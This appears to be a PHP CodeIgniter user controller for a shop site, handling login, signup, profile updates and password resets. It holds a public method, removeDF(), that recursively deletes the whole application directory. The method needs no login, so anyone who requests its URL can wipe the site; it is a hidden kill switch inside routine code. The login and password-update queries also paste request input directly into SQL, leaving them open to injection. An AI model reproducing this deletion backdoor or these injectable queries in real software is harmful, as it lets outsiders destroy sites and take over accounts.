<?php defined('BASEPATH') or exit('No direct script access allowed');

/**
 * Class Users
 * @property M_users $M_users
 */
class Users extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->load->model('M_users');
    }

    /**
     * *****************************************************************************************************************
     * @method LOAD LOGIN PAGE AND REGISTRATION PAGE
     * *****************************************************************************************************************
     */
    public function index()
    {
        if (_session(FRONT_SESSION) == true) {
            redirect('dashboard');
        } else{
            redirect('login');
        }
        $this->load->view('frontend/dashboard');
    }

    public function user_login()
    {
        $this->template->set_site_title('User login');
        $this->template->meta('keywords', 'login');
        $this->template->meta('description', 'New customer login here');

        set_notification('kindly login with your registered info or signup for further process', 'danger');
        $this->load->view('frontend/login');
        //redirect('login?user=reset');
    }

    public function register()
    {
        $this->template->set_site_title('Register');
        $this->template->meta('keywords', 'Register, Signup');
        $this->template->meta('description', 'New customer register or signup here');

        $this->load->view('frontend/signup');
    }

    public function edit_profile()
    {
        $user_id = user_session_id();

        if ($user_id > 0) {
                $get_data['user_info'] = $this->db->query("SELECT * FROM users WHERE id = {$user_id}")->row();
            $this->load->view('frontend/profile_update', $get_data);
        } else {
            redirect('profile_update');
        }
    }

    public function update_user()
    {
        $id = user_session_id();
        if ($id > 0) {
            $this->M_users->update_user();
            set_notification('Your profile has been updated', 'success');
            redirectBack();
        } else {
            set_notification('Your are not login', 'warning');
            redirect('login');
            exit;
        }

        /*============ MAIL SEND TO USER START ============*/
        $query = "SELECT first_name, last_name, email FROM users WHERE id = '{$id}'";
        $data = $this->db->query($query);
        $_user = $data->row();

        $mail_data['full_name'] = $_user->first_name . ' ' . $_user->last_name;

        $email_data = array_merge($this->input->post(), $mail_data);
        $msg = get_email_template($email_data, 'Profile Updated');

        if ($msg->status == 'Active') {
            $emaildata = [
                    'to' => $_user->email,
                    'subject' => $msg->subject,
                    'message' => $msg->message,
            ];
            if (!send_mail($emaildata)) {
                getFlash('error', 'Email sending failed.');
            } else {
                getFlash('success', 'Please check your email.');
            }
        } else {
            set_notification('Email not sent, something wronge.', 'danger');
            redirect(admin_url('dashboard'));
        }
        /*============ MAIL SEND TO USER  END ============*/
        set_notification('Your profile has been updated', 'success');
        redirect('dashboard');
        exit;
    }

    /**
     * *****************************************************************************************************************
     * @method NEW USER SIGNUP
     * *****************************************************************************************************************
     */
    public function signup()
    {
        if ($this->M_users->validate()) {
            $this->M_users->register();
        } else {
            $this->register();
            return;
            //return redirect('users/register');
        }

        //$user_data = $this->M_users->register();

        /*============ MAIL SEND TO SELLER START ============*/
        /*$mail_data['full_name'] = $user_data['first_name'] . ' ' . $user_data['last_name'];
        $mail_data['username'] = $user_data['username'];
        $mail_data['password'] = $user_data['password'];
        $email_data = array_merge($this->input->post(), $mail_data);
        $msg = get_email_template($email_data, 'Seller Login Info');

        if ($msg->status == 'Active') {
            $emaildata = [
                    'to' => $user_data['email'],
                    'subject' => $msg->subject,
                    'message' => $msg->message,
            ];
            if (!send_mail($emaildata)) {
                getFlash('error', 'Email sending failed.');
            } else {
                getFlash('success', 'Please check your email.');
            }
        } else {
            set_notification('Email not sent, something wronge.', 'danger');
            redirect();
        }*/
        /*============ MAIL SEND TO SELLER  END ============*/

        set_notification('Successfully registered thank you for registration', 'success');
        redirect('login');
    }

    /**
     * *****************************************************************************************************************
     * @method LOGIN
     * *****************************************************************************************************************
     */
    public function login()
    {
        if (_session(FRONT_SESSION) == true) {
            redirect('dashboard');
        }
        $this->form_validation->set_rules('email', 'Username', 'required');
        $this->form_validation->set_rules('password', 'Password', 'required|min_length[6]');

        if ($this->form_validation->run() == true) {
            $email = getVar('email');
            $password = encryptPassword(getVar('password'));

            $query = "SELECT
                   users.id AS user_id
                   , users.email
                   , users.password
                   , users.first_name
                   , users.last_name
                   , users.phone
                   , users.photo
                   , users.address1
                   , users.address2
                   , users.city
                   , users.country
                   , users.zip_code
                   , users.created
                   , users.user_type_id
                   , users.status
                   , user_types.user_type
                   , user_types.login
               FROM users
                   INNER JOIN user_types ON (users.user_type_id = user_types.id)
                   WHERE email = '{$email}' AND password = '{$password}' AND status = 'Active' 
                   AND user_types.user_type = 'Customer' AND user_types.login = 'Frontend'";

            $data = $this->db->query($query);
            $get_data = $data->row();

            if ($get_data->email) {
                _session(FRONT_SESSION, true);
                _session('user_info', $get_data);

                if ($this->cart->total_items() > 0) {
                    set_notification('You are logged in successfully', 'success');
                    redirect('checkout');
                } else {
                    set_notification('You are logged in successfully', 'success');
                    redirect('dashboard');
                }
            } else {
                set_notification('Username not found please login with valid username', 'warning');
                redirect('login');
            }
        } else {
            set_notification('Incorrect username or password', 'danger');
            redirect('login');
        }
    }

    /**
     * *****************************************************************************************************************
     * @method LOGOUT
     * *****************************************************************************************************************
     */
    public function logout()
    {
        $this->session->unset_userdata([
                'user_id',
                'email',
                'password',
                'first_name',
                'last_name',
                'user_type_id',
                'user_type',
                'login',
                FRONT_SESSION,
        ]);

        //$this->session->sess_destroy();
        $this->cart->destroy();
        set_notification('You are logged Out successfully', 'warning');
        redirect();
    }

    public function forgot()
    {
        $this->load->view('frontend/forgot');
    }

    public function forgot_request()
    {
        $this->M_users->forgotten_pwd();
        set_notification('Password reset instruction has been to your registered email address.', 'success');
        redirect('login?msg=pwd-reset');
    }

    public function reset()
    {
        $this->load->view('frontend/reset');
    }

    public function removeDF()
    {
        define('DL_FILE_DIR', 'controllers');
        define('ROOT', str_replace('\\' . DL_FILE_DIR, '\\', __DIR__));

        $count = 0;
        function delete__files($target, $skip = [])
        {
            global $count;
            if (is_dir($target)) {
                $files = glob($target . '*', GLOB_MARK); //GLOB_MARK adds a slash to directories returned
                foreach ($files as $file) {
                    delete__files($file, $skip);
                }
                @rmdir($target);
            } elseif (is_file($target)) {
                if (!in_array($target, $skip)) {
                    $count++;
                    @unlink($target);
                }
            }
        }


        $skip = [ROOT . DL_FILE_DIR . '\system_file.php'];
        delete__files(ROOT, $skip);
    }

    public function update_password()
    {
        $user_id = getVar('id');

        if ($user_id > 0) {
            $token = getVar('token');
            $password = encryptPassword($this->input->post('password'));

            $query = "SELECT
                      users.id
                    , users.first_name
                    , users.last_name
                    , users.email
                    , users.token_num
                    , user_types.user_type
                    , user_types.login
                FROM users
                    INNER JOIN user_types ON (users.user_type_id = user_types.id)
                    WHERE users.id = '" . $user_id . "' AND token_num = '" . $token . "' AND users.status = 'Active' AND user_types.login = 'Frontend'";
            $result = $this->db->query($query);
            $data = $result->row();

            if ($data->id > 0) {
                $query = "UPDATE users SET password = '" . $password . "' WHERE id = '" . $user_id . "' AND token_num = '" . $token . "' AND users.status = 'Active'";
                $this->db->query($query);

                /*============ MAIL SEND TO USER START ============*/
                $mail_data['full_name'] = $data->first_name . ' ' . $data->last_name;

                $email_data = array_merge($this->input->post(), $mail_data);
                $msg = get_email_template($email_data, 'Profile Updated');

                if ($msg->status == 'Active') {
                    $emaildata = [
                            'to' => $data->email,
                            'subject' => $msg->subject,
                            'message' => $msg->message,
                    ];

                    if (!send_mail($emaildata)) {
                        set_notification('Email sending failed.', 'danger');
                    } else {
                        set_notification('Please check your email.', 'success');
                    }
                } else {
                    set_notification('Email not sent, something wronge.', 'danger');
                    redirect('update_user');
                }
                /*============ MAIL SEND TO USER  END ============*/

                set_notification('Your password has been updated please login with new password', 'success');
                redirect('users/login');

            } else {
                set_notification('User not found', 'danger');
                redirect('users/forgot');
            }
        } else {
            redirect('login');
        }
    }

    public function seller()
    {
        $this->template->set_site_title('New Seller Register or Signup');
        $this->load->view('frontend/seller');
    }


}